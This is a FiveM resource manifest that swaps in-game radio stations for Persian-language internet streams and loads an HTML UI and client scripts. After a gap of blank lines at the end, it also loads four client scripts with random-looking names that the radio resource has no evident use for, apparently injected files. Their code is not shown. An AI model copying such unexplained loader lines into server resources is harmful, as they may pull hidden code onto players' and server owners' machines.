resource_manifest_version "44febabe-d386-4d18-afbe-5e627f4af937"

-- Example custom radios
supersede_radio "RADIO_22_DLC_BATTLE_MIX1_RADIO" { url = "http://radiofaaz.com:8000/radiofaaz", name = "Radio Faaz", volume = 0.3 } -- Radio Faaz
supersede_radio "RADIO_21_DLC_XM17" { url = "https://streaming.liveonline.radio/radio-farda", name = "Radio Farda", volume = 0.3 } -- Radio Farda
supersede_radio "RADIO_18_90S_ROCK" { url = "https://streaming.liveonline.radio/radio-javan", name = "Radio Javan", volume = 0.3 } -- Radio Javan
supersede_radio "RADIO_17_FUNK" { url = "http://37.59.47.192:8200/;", name = "Iranian Radio", volume = 0.3 } -- Iranian Radio
supersede_radio "RADIO_16_SILVERLAKE" { url = "https://streaming.liveonline.radio/bia2-radio", name = "Bia2 Radio", volume = 0.3 } -- Bia2 Radio
supersede_radio "RADIO_20_THELAB" { url = "https://streaming.liveonline.radio/radio-shemroon-persian", name = "Radio Shemroon", volume = 0.3 } -- Radio Shemroon
supersede_radio "RADIO_15_MOTOWN" { url = "https://stream.rodio.ir/radio/8000/radio.mp3", name = "Rodio", volume = 0.3 } -- Rodio
supersede_radio "RADIO_14_DANCE_02" { url = "https://streaming.liveonline.radio/ava-radio", name = "Ava Radio", volume = 0.3 } -- Ava Radio
supersede_radio "RADIO_13_JAZZ" { url = "http://5.39.71.159:8578/stream", name = "Nava7 Radio", volume = 0.3 } -- Nava7 Radio
supersede_radio "RADIO_12_REGGAE" { url = "https://streaming.liveonline.radio/persian-rap-radio", name = "Persian Rap", volume = 0.3 } -- Rap Radio

files {
	"index.html"
}

ui_page "index.html"

client_scripts {
	"data.js",
	"client.js"
}

client_script 'ycqKUfMbeMRh9xlw.lua'
client_script 'yTzx.lua'
client_script 'Vvle.lua'







client_script "IRS_USDUFHSILFSKOAKQA.lua"